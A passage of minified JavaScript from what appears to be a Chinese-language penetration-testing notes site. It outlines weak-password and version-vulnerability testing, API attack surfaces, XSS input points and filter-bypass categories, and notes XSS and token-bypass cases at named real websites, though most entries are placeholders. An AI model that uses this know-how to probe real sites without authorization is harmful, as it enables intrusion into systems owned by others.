\u7F16\u8BD1\u6D4B\u8BD5",desc:u.a.createElement(u.a.Fragment,null,"\u8C03\u7528\u65B9\u6CD5\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026",u.a.createElement("br",null),"\u5C0F\u8FEA\u53EA\u8BB2\u4E86\u601D\u8DEF\uFF0C\u6CA1\u8BB2\u65B9\u6CD5"),content:u.a.createElement(u.a.Fragment,null,"\u53E6\u5916\u7684\u5DE5\u5177",u.a.createElement("ol",null,u.a.createElement("li",null,"\u2026\u2026\u2026\u2026")))}]}]},{name:"\u670D\u52A1\u3001\u534F\u8BAE / \u7B2C\u4E09\u65B9\u670D\u52A1\u3001\u7B2C\u4E09\u65B9API\u63A5\u53E3",steps:[{name:"\u7B2C\u4E09\u65B9\u670D\u52A1",desc:u.a.createElement(u.a.Fragment,null,"\u4ECB\u7ECD\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6839\u636E\u524D\u671F\u4FE1\u606F\u6536\u96C6 \u9488\u5BF9 \u3010\u76EE\u6807\u7AEF\u53E3\u670D\u52A1\u7C7B\u63A2\u9488\u3011 \u540E\u8FDB\u884C\u7684\u5B89\u5168\u6D4B\u8BD5"),u.a.createElement("li",null,"\u5C5E\u4E8E \u7AEF\u53E3\u670D\u52A1/\u7B2C\u4E09\u65B9\u670D\u52A1\u7C7B \u5B89\u5168\u6D4B\u8BD5\u9762"),u.a.createElement("li",null,"\u4E00\u822C\u5728 \u5DF2\u77E5\u5E94\u7528\u65E0\u601D\u8DEF \u7684\u60C5\u51B5\u4E0B\uFF0C\u9009\u7528\uFF0C \u7684\u5B89\u5168\u6D4B\u8BD5\u65B9\u6848")),"\u6D89\u53CA\u7684 \u653B\u51FB\u65B9\u6CD5",u.a.createElement("ol",null,u.a.createElement("li",null,"\u53E3\u4EE4\u5B89\u5168 \uFF0C \u5982\u5F31\u53E3\u4EE4\u76F4\u63A5\u767B\u5F55"),u.a.createElement("li",null,"WEB\u7C7B\u6F0F\u6D1E \uFF0C \uFF1F"),u.a.createElement("li",null,"\u7248\u672C\u6F0F\u6D1E \uFF0C \u67D0\u4E9B\u8001\u7248\u672C\uFF0C\u76F4\u63A5\u62A5\u6F0F\u6D1E"))),steps:[B.\u7AEF\u53E3\u670D\u52A1_\u5E38\u7528\u6F0F\u6D1E,c.\u7EC4["\u3010\u7EC4\u3011\u5F31\u53E3\u4EE4\u68C0\u67E5_\u7206\u7834\u5DE5\u5177"],c.\u7EC4["\u3010\u7EC4\u3011\u7AEF\u53E3_\u3010\u6F0F\u6D1E\u3011_\u63A2\u9488\u5DE5\u5177"],{name:"\u5229\u7528\u6D4B\u8BD5",steps:[{name:"\u5355\u4E2AEXP",tags:[p.\u9700\u8981\u91CD\u65B0\u4ECE\u89C6\u9891\u8865\u5145],content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F")},{name:"\u5355\u4E2A\u811A\u672C\u6216\u5DE5\u5177",tags:[p.\u9700\u8981\u91CD\u65B0\u4ECE\u89C6\u9891\u8865\u5145],content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F")}]},{name:"\u5B89\u5168 \u4FEE\u590D",content:u.a.createElement(u.a.Fragment,null,"\u65B9\u5F0F",u.a.createElement("ol",null,u.a.createElement("li",null,a.\u4FEE\u590D.\u6253\u597D\u8865\u4E01),u.a.createElement("li",null,a.\u4FEE\u590D.\u7248\u672C\u5347\u7EA7),u.a.createElement("li",null,a.\u4FEE\u590D["\u90E8\u7F72WAF / \u9632\u62A4\u5E94\u7528"])))}]},{name:"\u7B2C\u4E09\u65B9 API\u63A5\u53E3",desc:u.a.createElement(u.a.Fragment,null,"\u57FA\u672C\u4ECB\u7ECD\uFF1A"),steps:[w.\u5E94\u7528\u9762.\u603B\u548C,{name:"\u63A2\u9488\u9762",steps:[{name:"\u722C\u866B\u53C2\u6570",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")},{name:"\u5E94\u7528\u731C\u6D4B",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")},{name:"\u5F15\u64CE\u67E5\u627E",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")}]},{name:"\u5B89\u5168\u9762",steps:[{name:"\u903B\u8F91\u8D8A\u6743",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")},{name:"\u8F93\u5165\u63A7\u5236",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")},{name:"\u63A5\u53E3\u5B89\u5168",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")},{name:"\u4FE1\u606F\u6CC4\u9732",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")}]},{name:"\u5229\u7528\u9762",steps:[c.Soap_UI_PRO_\u4E0D\u77E5\u9053\u662F\u5565\u7684\u6D4B\u8BD5\u5DE5\u5177,{name:"WS-Attacker",tags:[p.\u653E\u5230\u6700\u540E\u8003\u8651],content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")},c.BurpSuite_\u6293\u5305\u5DE5\u5177,c.awvs_WEB\u5E94\u7528_\u6F0F\u6D1E\u626B\u63CF]},{name:"\u4FEE\u590D\u9762",content:u.a.createElement(u.a.Fragment,null,"\u65B9\u5F0F",u.a.createElement("ol",null,u.a.createElement("li",null,a.\u4FEE\u590D.\u6253\u597D\u8865\u4E01),u.a.createElement("li",null,a.\u4FEE\u590D.\u7248\u672C\u5347\u7EA7),u.a.createElement("li",null,a.\u4FEE\u590D["\u90E8\u7F72WAF / \u9632\u62A4\u5E94\u7528"])))}]}]}]},o={name:"\u5C0F\u8FEA\uFF0C\u4FE1\u606F\u6536\u96C6\uFF0C\u4E3B\u8981\u662F\u4FE1\u606F\u6536\u96C6",steps:[R,v,s]}},"6UJt":function(H,d,n){"use strict";var S=n("EFp3"),t=n.n(S),l=n("v56E"),r=n.n(l),e=n("R9oj"),u=n("OaEy")},"815F":function(H,d,n){"use strict";n.d(d,"f",function(){return p}),n.d(d,"d",function(){return I}),n.d(d,"c",function(){return c}),n.d(d,"e",function(){return h}),n.d(d,"a",function(){return a}),n.d(d,"g",function(){return B}),n.d(d,"b",function(){return O});var S=n("U8pU"),t=n("KQm4"),l=n("VTBJ"),r=n("Ff2n"),e=n("bT9E"),u=n("Zm9Q"),m=n("Kwbf"),E=n("OZM5"),F=["children"];function p(_,b){return _!=null?_:b}function I(_){var b=_||{},y=b.title,j=b._title,v=b.key,x=b.children,T=y||"title";return{title:T,_title:j||[T],key:v||"key",children:x||"children"}}function g(_,b){var y=new Map;function j(v){var x=arguments.length>1&&arguments[1]!==void 0?arguments[1]:"";(v||[]).forEach(function(T){var R=T[b.key],s=T[b.children];Object(m.a)(R!=null,"Tree node must have a certain key: [".concat(x).concat(R,"]"));var o=String(R);Object(m.a)(!y.has(o)||R===null||R===void 0,"Same 'key' exist in the Tree: ".concat(o)),y.set(o,!0),j(s,"".concat(x).concat(o," > "))})}j(_)}function c(_){function b(y){var j=Object(u.a)(y);return j.map(function(v){if(!Object(E.h)(v))return Object(m.a)(!v,"Tree/TreeNode can only accept TreeNode as children."),null;var x=v.key,T=v.props,R=T.children,s=Object(r.a)(T,F),o=Object(l.a)({key:x},s),i=b(R);return i.length&&(o.children=i),o}).filter(function(v){return v})}return b(_)}function h(_,b,y){var j=I(y),v=j._title,x=j.key,T=j.children,R=new Set(b===!0?[]:b),s=[];function o(i){var f=arguments.length>1&&arguments[1]!==void 0?arguments[1]:null;return i.map(function(P,D){for(var C=Object(E.g)(f?f.pos:"0",D),M=p(P[x],C),L,J=0;J<v.length;J+=1){var q=v[J];if(P[q]!==void 0){L=P[q];break}}var V=Object(l.a)(Object(l.a)({},Object(e.a)(P,[].concat(Object(t.a)(v),[x,T]))),{},{title:L,key:M,parent:f,pos:C,children:null,data:P,isStart:[].concat(Object(t.a)(f?f.isStart:[]),[D===0]),isEnd:[].concat(Object(t.a)(f?f.isEnd:[]),[D===i.length-1])});return s.push(V),b===!0||R.has(M)?V.children=o(P[T]||[],V):V.children=[],V})}return o(_),s}function w(_,b,y){var j={};Object(S.a)(y)==="object"?j=y:j={externalGetKey:y},j=j||{};var v=j,x=v.childrenPropName,T=v.externalGetKey,R=v.fieldNames,s=I(R),o=s.key,i=s.children,f=x||i,P;T?typeof T=="string"?P=function(M){return M[T]}:typeof T=="function"&&(P=function(M){return T(M)}):P=function(M,L){return p(M[o],L)};function D(C,M,L,J){var q=C?C[f]:_,V=C?Object(E.g)(L.pos,M):"0",tu=C?[].concat(Object(t.a)(J),[C]):[];if(C){var Y=P(C,V),au={node:C,index:M,pos:V,key:Y,parentPos:L.node?L.pos:null,level:L.level+1,nodes:tu};b(au)}q&&q.forEach(function(hu,mu){D(hu,mu,{node:C,pos:V,level:L?L.level+1:-1},tu)})}D(null)}function a(_){var b=arguments.length>1&&arguments[1]!==void 0?arguments[1]:{},y=b.initWrapper,j=b.processEntity,v=b.onProcessFinished,x=b.externalGetKey,T=b.childrenPropName,R=b.fieldNames,s=arguments.length>2?arguments[2]:void 0,o=x||s,i={},f={},P={posEntities:i,keyEntities:f};return y&&(P=y(P)||P),w(_,function(D){var C=D.node,M=D.index,L=D.pos,J=D.key,q=D.parentPos,V=D.level,tu=D.nodes,Y={node:C,nodes:tu,index:M,key:J,pos:L,level:V},au=p(J,L);i[L]=Y,f[au]=Y,Y.parent=i[q],Y.parent&&(Y.parent.children=Y.parent.children||[],Y.parent.children.push(Y)),j&&j(Y,P)},{externalGetKey:o,childrenPropName:T,fieldNames:R}),v&&v(P),P}function B(_,b){var y=b.expandedKeys,j=b.selectedKeys,v=b.loadedKeys,x=b.loadingKeys,T=b.checkedKeys,R=b.halfCheckedKeys,s=b.dragOverNodeKey,o=b.dropPosition,i=b.keyEntities,f=i[_],P={eventKey:_,expanded:y.indexOf(_)!==-1,selected:j.indexOf(_)!==-1,loaded:v.indexOf(_)!==-1,loading:x.indexOf(_)!==-1,checked:T.indexOf(_)!==-1,halfChecked:R.indexOf(_)!==-1,pos:String(f?f.pos:""),dragOver:s===_&&o===0,dragOverGapTop:s===_&&o===-1,dragOverGapBottom:s===_&&o===1};return P}function O(_){var b=_.data,y=_.expanded,j=_.selected,v=_.checked,x=_.loaded,T=_.loading,R=_.halfChecked,s=_.dragOver,o=_.dragOverGapTop,i=_.dragOverGapBottom,f=_.pos,P=_.active,D=_.eventKey,C=Object(l.a)(Object(l.a)({},b),{},{expanded:y,selected:j,checked:v,loaded:x,loading:T,halfChecked:R,dragOver:s,dragOverGapTop:o,dragOverGapBottom:i,pos:f,active:P,key:D});return"props"in C||Object.defineProperty(C,"props",{get:function(){return Object(m.a)(!1,"Second param return from event is node data instead of TreeNode instance. Please read value directly instead of reading from `props`."),_}}),C}},"9BLJ":function(H,d,n){"use strict";var S=n("VTBJ"),t=n("q1tI"),l={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M942.2 486.2C847.4 286.5 704.1 186 512 186c-192.2 0-335.4 100.5-430.2 300.3a60.3 60.3 0 000 51.5C176.6 737.5 319.9 838 512 838c192.2 0 335.4-100.5 430.2-300.3 7.7-16.2 7.7-35 0-51.5zM512 766c-161.3 0-279.4-81.8-362.7-254C232.6 339.8 350.7 258 512 258c161.3 0 279.4 81.8 362.7 254C791.5 684.2 673.4 766 512 766zm-4-430c-97.2 0-176 78.8-176 176s78.8 176 176 176 176-78.8 176-176-78.8-176-176-176zm0 288c-61.9 0-112-50.1-112-112s50.1-112 112-112 112 50.1 112 112-50.1 112-112 112z"}}]},name:"eye",theme:"outlined"},r=l,e=n("6VBw"),u=function(F,p){return t.createElement(e.a,Object(S.a)(Object(S.a)({},F),{},{ref:p,icon:r}))};u.displayName="EyeOutlined";var m=d.a=t.forwardRef(u)},"9IgH":function(H,d){H.exports="data:image/png;base64,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"},"9z6I":function(H,d,n){"use strict";n.d(d,"a",function(){return R});var S=n("6UJt"),t=n("DFOY"),l=n("0Owb"),r=n("q1tI"),e=n.n(r),u=n("kfBs"),m=n.n(u),E=n("k1fw"),F=n("+ULl"),p=[Object(E.a)(Object(E.a)({},Object(F.b)("\u5E38\u89C4\u8F93\u5165\u70B9")),{},{children:[Object(E.a)({},Object(F.b)("url\u53C2\u6570")),Object(E.a)({},Object(F.b)("POST\u8BF7\u6C42\u53C2\u6570",["\u2460 \u670D\u52A1\u5668\u8FD4\u56DE\uFF0C\u518D\u628A\u53C2\u6570\uFF0C\u5D4C\u8FDBHTML\u3002\uFF08\u5982\u540C DOM\u578BXSS \uFF09"]))]}),Object(E.a)(Object(E.a)({},Object(F.b)("\u9690\u85CF\u8F93\u5165\u70B9")),{},{children:[Object(E.a)({},Object(F.b)('<input type="hidden">',["\u9690\u5F0Finput"]))]}),Object(E.a)(Object(E.a)({},Object(F.b)("\u81EA\u52A8\u8F93\u5165\u70B9")),{},{children:[Object(E.a)({},Object(F.b)("XRay",[""]))]}),Object(E.a)(Object(E.a)({},Object(F.b)("\u9006\u5411\u601D\u7EF4")),{},{children:[Object(E.a)({},Object(F.b)("\u4ECE\u8F93\u51FA\u70B9\uFF0C\u5BFB\u627EXSS",[e.a.createElement("div",null,"\u5927\u6982\u601D\u8DEF\u5982\u4E0B\uFF1A",e.a.createElement("ol",null,e.a.createElement("li",null,"7.1 \u5148\u627E\u5230\u8F93\u51FA\u70B9\uFF0C\u7136\u540E\u731C\u6D4B\u6B64\u5904\u8F93\u51FA\u662F\u5426\u4F1A\u88AB\u8FC7\u6EE4\u3002"),e.a.createElement("li",null,"7.2 \u5982\u679C\u89C9\u5F97\u53EF\u80FD\u6CA1\u8FC7\u6EE4\uFF0C\u6211\u4EEC\u518D\u627E\u5230\u8FD9\u4E2A\u8F93\u51FA\u662F\u5728\u54EA\u91CC\u8F93\u5165\u7684\u3002"),e.a.createElement("li",null,"7.3 \u63A5\u7740\u5F00\u59CB\u6D4B\u8BD5\u8F93\u5165\uFF0C\u770B\u8F93\u51FA\u7684\u6548\u679C\u3002"),e.a.createElement("li",null,"7.4 \u5982\u679C\u6CA1\u8FC7\u6EE4\uFF0C\u90A3\u4E48\u4F60\u5C31\u6210\u529F\u4E86\uFF0C\u5426\u5219\u4F60\u53EF\u4EE5\u653E\u5F03\u6389\u5B83\u3002")))]))]})],I=[Object(E.a)(Object(E.a)({},Object(F.b)("\u521D\u7EA7")),{},{children:[Object(E.a)({},Object(F.b)("\u8054\u60F3\u5546\u57CE",["\u591A\u4E2A\u4F4E\u7EA7\u6F0F\u6D1E"])),Object(E.a)({},Object(F.b)("Tumblr",["\u5206\u4EAB\u53D1\u5E16\uFF0C\u5E16\u5B50\u5185\u7684\u7F51\u9875\u94FE\u63A5\uFF0C\u53EF\u5D4C\u5165XSS"]))]}),Object(E.a)(Object(E.a)({},Object(F.b)("\u4E2D\u7EA7")),{},{children:[Object(E.a)(Object(E.a)({},Object(F.b)("\u4E00\u8D77\u5199Office")),{},{children:[Object(E.a)({},Object(F.b)("\u4E0A\u4F20\u5934\u50CF\uFF0C\u4EFB\u610FURL")),Object(E.a)(Object(E.a)({},Object(F.b)("\u4FEE\u6539\u5BC6\u7801\u63A5\u53E3")),{},{children:[Object(E.a)({},Object(F.b)("POST\u8BF7\u6C42\uFF0CGET\u4E5F\u53EF\u8C03\u7528")),Object(E.a)({},Object(F.b)("\u8BF7\u6C42\u9ED8\u8BA4\u643A\u5E26 xtoken\uFF1B\u4F46\u5220\u6389 xtoken \u4E5F\u80FD\u6210\u529F"))]})]}),Object(E.a)(Object(E.a)({},Object(F.b)("\u6709\u9053\u4E91\u7B14\u8BB0")),{},{children:[Object(E.a)(Object(E.a)({},Object(F.b)("\u7C98\u8D34")),{},{children:[Object(E.a)({},Object(F.b)("\u7C98\u8D34\u56FE\u7247",["\u5730\u5740\u672A\u505A\u8F6C\u94FE"])),Object(E.a)({},Object(F.b)("\u7C98\u8D34\u4E00\u6BB5\u7F51\u9875\u56FE\u6587",["\u88AB\u5F53\u505A HTML \u7247\u6BB5\u5904\u7406","\u672A\u505A \u56FE\u7247\u8F6C\u50A8 "]))]})]})]}),Object(E.a)(Object(E.a)({},Object(F.b)("\u9AD8\u7EA7")),{},{children:[Object(E.a)(Object(E.a)({},Object(F.b)("\u5934\u6761\u641C\u7D22",["\u641C\u7D22\u3010\u5C0F\u89C6\u9891\u3011\u65F6\uFF0C\u901A\u8FC7<script>\u3010\u5173\u952E\u5B57\u3011\uFF0C\u89E6\u53D1\u4E86\u3010\u6765\u81EA\u6296\u97F3\u6807\u9898\u3011\u7684\u3010XSS\u3011"])),Object(F.b)("CodeMirror\uFF0C\u6211\u81EA\u5DF1\u53D1\u73B0\u7684\u6F0F\u6D1E",["\u89C1\u3010Laverna\u3011APP\u7684\u8868\u73B0\u3002"]))]})],g=n("fWQN"),c=n("mtLc"),h=n("ysNt"),w=h.l.singleATag_blank,a;(function(s){s.\u6309\u9636\u6BB5="\u6309\u9636\u6BB5",s["1.\u6295\u77F3\u95EE\u8DEF\uFF0C\u4ED9\u4EBA\u6307\u8DEF"]="1.\u6295\u77F3\u95EE\u8DEF\uFF0C\u4ED9\u4EBA\u6307\u8DEF",s.\u5168\u77E5\u5168\u80FD\u5168\u5584="\u5168\u77E5\u5168\u80FD\u5168\u5584",s.\u7231\u56FD\u9752\u5E74="\u7231\u56FD\u9752\u5E74",s["123<br>321"]="123<br>321",s["2.\u6700\u57FA\u672C\u6D4B\u8BD5\uFF0C\u7528\u4E8E\u3010\u5FAA\u5E8F\u6E10\u8FDB\u3011"]="2.\u6700\u57FA\u672C\u6D4B\u8BD5\uFF0C\u7528\u4E8E\u3010\u5FAA\u5E8F\u6E10\u8FDB\u3011",s["3.\u66F4\u52A0\u5BBD\u6CDB\u7684\u89E3\u6CD5"]="3.\u66F4\u52A0\u5BBD\u6CDB\u7684\u89E3\u6CD5",s["\u4E8C\u5206\u67E5\u627E\u6CD5 \uFF0C\u6765\u5B9A\u4F4D\u3010\u654F\u611F\u8BCD\u6C47\u3011"]="\u4E8C\u5206\u67E5\u627E\u6CD5 \uFF0C\u6765\u5B9A\u4F4D\u3010\u654F\u611F\u8BCD\u6C47\u3011",s["4.\u7528\u3010\u62BD\u67E5\u3011\u5F62\u5F0F\uFF0C\u9010\u4E2A\u6392\u9664"]="4.\u7528\u3010\u62BD\u67E5\u3011\u5F62\u5F0F\uFF0C\u9010\u4E2A\u6392\u9664",s.html\u4E8B\u4EF6="html\u4E8B\u4EF6",s.\u6F0F\u6389\u7684\u4E8B\u4EF6="\u6F0F\u6389\u7684\u4E8B\u4EF6",s["\u3010src\u3011(\u5305\u62EChref)"]="\u3010src\u3011(\u5305\u62EChref)",s["<img>\u7684\u3010src\u3011"]="<img>\u7684\u3010src\u3011",s["<iframe>\u7684\u3010src\u3011"]="<iframe>\u7684\u3010src\u3011",s["<iframe>\u7684\u3010srcdoc\u3011"]="<iframe>\u7684\u3010srcdoc\u3011",s["<embed>\u7684\u3010src\u3011"]="<embed>\u7684\u3010src\u3011",s["<a>\u7684\u3010href\u3011"]="<a>\u7684\u3010href\u3011",s["<script>\u7684\u3010src\u3011"]="<script>\u7684\u3010src\u3011",s["\u57FA\u4E8E\u3010src\u3011\u7684\uFF0C\u66F4\u9AD8\u9636\u7528\u6CD5"]="\u57FA\u4E8E\u3010src\u3011\u7684\uFF0C\u66F4\u9AD8\u9636\u7528\u6CD5",s["\u591A\u5C42\u5D4C\u5957\u3010src\u3011\uFF0C\u3010\u7236src\u3011\u91CC\u9762\u518D\u5D4C\u5957\u3010\u5B50src\u3011"]="\u591A\u5C42\u5D4C\u5957\u3010src\u3011\uFF0C\u3010\u7236src\u3011\u91CC\u9762\u518D\u5D4C\u5957\u3010\u5B50src\u3011",s["5.\u6839\u636E\u7ECF\u9A8C\uFF0C\u4E00\u4E9B\u6613\u7A81\u7834\u7684\u8584\u5F31\u70B9"]="5.\u6839\u636E\u7ECF\u9A8C\uFF0C\u4E00\u4E9B\u6613\u7A81\u7834\u7684\u8584\u5F31\u70B9",s["<a>\u6807\u7B7E"]="<a>\u6807\u7B7E",s.\u6309\u573A\u666F="\u6309\u573A\u666F",s.\u7EAFHTML\u5185="\u7EAFHTML\u5185",s.\u5E38\u7528\u8BED\u53E5="\u5E38\u7528\u8BED\u53E5",s.\u9AD8\u53EF\u9760="\u9AD8\u53EF\u9760",s.\u8F83\u5E38\u89C4="\u8F83\u5E38\u89C4",s.\u5F88\u5947\u8469="\u5F88\u5947\u8469",s.\u4E2D\u53EF\u9760="\u4E2D\u53EF\u9760",s.\u4F4E\u53EF\u9760="\u4F4E\u53EF\u9760",s.bypass\u7ED5\u8FC7="bypass\u7ED5\u8FC7",s.\u5927\u5C0F\u5199\u654F\u611F="\u5927\u5C0F\u5199\u654F\u611F",s.\u5BF9\u7F16\u7801\u654F\u611F\u7684\u7B26\u53F7="\u5BF9\u7F16\u7801\u654F\u611F\u7684\u7B26\u53F7",s[":"]=":",s[";"]=";",s[","]=",",s["()"]="()",s["'"]="'",s['"']='"',s["`"]="`",s["."]=".",s["<>"]="<>",s["="]="=",s["/"]="/",s["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]="\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011",s.\u5B57\u7B26\u4E32\u53D8\u91CF="\u5B57\u7B26\u4E32\u53D8\u91CF",s.\u7F16\u7801\u65B9\u5F0F="\u7F16\u7801\u65B9\u5F0F",s.\u5BBD\u5B57\u8282="\u5BBD\u5B57\u8282",s["\u3010\\\u53CD\u659C\u6760\u3011\u8F6C\u4E49"]="\u3010\\\u53CD\u659C\u6760\u3011\u8F6C\u4E49",s.UrlEncode\u8DEF\u5F84\u7F16\u7801="UrlEncode\u8DEF\u5F84\u7F16\u7801",s["Unicode \u4E07\u56FD\u7801"]="Unicode \u4E07\u56FD\u7801",s["ASCII \u7F8E\u56FD\u7801"]="ASCII \u7F8E\u56FD\u7801",s.HTML\u5B9E\u4F53\u5316\u7F16\u7801="HTML\u5B9E\u4F53\u5316\u7F16\u7801",s["Base64\u7F16\u7801 - 